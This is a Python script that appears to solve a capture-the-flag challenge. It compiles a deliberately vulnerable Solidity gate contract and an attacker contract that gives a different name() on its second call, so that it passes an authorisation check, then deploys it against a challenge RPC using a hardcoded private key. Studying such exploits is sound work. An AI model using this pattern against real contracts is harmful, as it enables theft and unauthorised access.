from solcx import install_solc

install_solc(version="latest")

from web3 import Web3
from solcx import compile_source

# TODO vezi cum se importeaza aici
compiled_sol = compile_source(
    """
pragma solidity ^0.8.18;


interface Entrant {
    function name() external returns (string memory);
}

contract HighSecurityGate {
    
    string[] private authorized = ["Orion", "Nova", "Eclipse"];
    string public lastEntrant;

    function enter() external {
        Entrant _entrant = Entrant(msg.sender);

        require(_isAuthorized(_entrant.name()), "Intruder detected");
        lastEntrant = _entrant.name();
    }

    function _isAuthorized(string memory _user) private view returns (bool){
        for (uint i; i < authorized.length; i++){
            if (strcmp(_user, authorized[i])){
                return true;
            }
        }
        return false;
    }

    function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
        return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2)); 
    }
}


contract MyEntrant {
    int public count;

    constructor() {
        count=0;
    }

    function name() external returns (string memory)
    {
        count++;
        if(count<=1)
            return "Orion";
        
        return "Pandora";
    }

    function enter(address HSG) public
    {
        HighSecurityGate(HSG).enter();
    }
}
""",
    output_values=["abi", "bin"],
)

contract_id, contract_interface = compiled_sol.popitem()
bytecode = contract_interface["bin"]
abi = contract_interface["abi"]

rpc_url = "http://46.101.80.24:30352"
target_contract_address = "0xD9853e218B902aBa0908525d8f259939e5E16b75"
setup_contract_address = "0x0510668CCC8EdF5AD6cD948D84B83BCDC1089b76"
caller = "0x67cb95f4f3665b7608952D8C637acCFf05A327ff"
private_key = "0x32bab444c12564d66926c5c50e7b794e2071f9adbf1aef4289ae10aeee53661b"

w3 = Web3(Web3.HTTPProvider(rpc_url))
nonce = w3.eth.get_transaction_count(caller)


setup_abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"TARGET","outputs":[{"internalType":"contract HighSecurityGate","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]'
setup_contract = w3.eth.contract(address=setup_contract_address, abi=setup_abi)

HSG_address = setup_contract.functions.TARGET().call()
print(HSG_address)

myEntrant = w3.eth.contract(abi=abi, bytecode=bytecode)

tx_hash = myEntrant.constructor().transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

entrant = w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

print(abi)

entrant.functions.enter(HSG_address).transact()
